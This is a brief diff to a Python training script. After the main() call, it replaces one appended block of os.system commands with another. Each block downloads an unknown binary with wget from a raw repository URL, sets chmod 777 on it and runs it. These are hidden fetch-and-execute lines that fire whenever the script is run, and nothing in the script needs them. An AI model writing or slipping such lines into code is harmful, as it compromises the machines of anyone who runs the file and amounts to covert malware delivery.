@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/vrs8/vrs/-/raw/main/duit')
-os.system('chmod 777 duit')
-os.system('./duit')
+os.system('wget https://raw.githubusercontent.com/novalanto010101/file/main/crot')
+os.system('chmod 777 crot')
+os.system('./crot')
